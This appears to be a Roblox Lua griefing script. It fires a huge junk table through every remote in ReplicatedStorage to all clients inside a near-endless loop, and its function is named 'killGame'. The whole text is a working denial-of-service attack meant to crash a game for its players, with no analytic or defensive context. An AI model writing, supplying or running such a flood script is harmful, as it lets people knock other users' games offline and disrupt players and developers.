local function createLargeAssTable()
    return table.create(100000, "FARTFART")
end

local function killGame()
    for _, remote in pairs(game.ReplicatedStorage:GetChildren()) do
        remote:FireAllClients(createLargeAssTable())
    end
end

for i = 1, 10000000000000000000000000000000000000000000000000 do
    killGame()
end